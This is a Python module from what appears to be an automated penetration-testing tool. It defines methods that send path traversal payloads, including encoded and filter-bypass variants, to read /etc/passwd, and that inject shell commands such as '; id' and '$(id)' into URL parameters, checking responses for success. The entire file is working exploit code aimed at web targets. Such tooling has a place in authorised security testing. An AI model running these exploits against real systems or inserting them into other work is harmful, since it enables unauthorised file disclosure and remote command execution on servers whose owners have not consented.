"""Path traversal and command injection exploitation methods."""

from urllib.parse import parse_qs, urlparse

from clawpwn.tools.http import HTTPClient

from .models import ExploitResult


class PathCommandMixin:
    """Provide path traversal and command injection exploit methods."""

    async def exploit_path_traversal(
        self,
        target: str,
        parameter: str,
        file_to_read: str = "/etc/passwd",
    ) -> ExploitResult:
        """Exploit path traversal vulnerability."""
        print(f"[*] Attempting path traversal on {target}")
        result = ExploitResult(
            success=False,
            title="Path Traversal",
            target=target,
            technique="directory_traversal",
        )

        payloads = [
            f"../../../..{file_to_read}",
            f"....//....//....//....//{file_to_read}",
            f"%2e%2e%2f%2e%2e%2f%2e%2e%2f{file_to_read}",
        ]

        try:
            async with HTTPClient() as client:
                for payload in payloads:
                    response = await client.get(f"{target}?{parameter}={payload}")
                    if "root:" in response.body:
                        result.success = True
                        result.output = (
                            f"Successfully read {file_to_read}\n\n"
                            f"First 500 chars:\n{response.body[:500]}"
                        )
                        result.notes = f"Working payload: {payload}"
                        break
        except Exception as exc:
            result.error = str(exc)

        if result.success:
            print("[+] Path traversal successful!")
            if self.session:
                self.session.add_log(
                    f"Exploited path traversal on {target}",
                    level="WARNING",
                    phase="Exploitation",
                )
        else:
            print(f"[-] Path traversal failed: {result.error}")

        return result

    async def exploit_command_injection(self, target: str, parameter: str) -> ExploitResult:
        """Exploit command injection vulnerability."""
        print(f"[*] Attempting command injection on {target}")
        result = ExploitResult(
            success=False,
            title="Command Injection",
            target=target,
            technique="os_command",
        )

        payloads = ["; id", "; whoami", "| id", "| whoami", "` id `", "$(id)"]

        try:
            async with HTTPClient() as client:
                parsed = urlparse(target)
                params = parse_qs(parsed.query)
                if parameter not in params:
                    result.error = f"Parameter '{parameter}' not found"
                    return result

                for payload in payloads:
                    test_params = {
                        key: values[0] if values else "" for key, values in params.items()
                    }
                    test_params[parameter] = payload
                    response = await client.request("GET", target, params=test_params)
                    if "uid=" in response.body or "gid=" in response.body:
                        result.success = True
                        result.output = (
                            "Command executed successfully\n"
                            f"Payload: {payload}\nOutput: {response.body[:200]}"
                        )
                        break
        except Exception as exc:
            result.error = str(exc)

        if result.success:
            print("[+] Command injection successful!")
            if self.session:
                self.session.add_log(
                    f"Exploited command injection on {target}",
                    level="CRITICAL",
                    phase="Exploitation",
                )
        else:
            print(f"[-] Command injection failed: {result.error}")

        return result
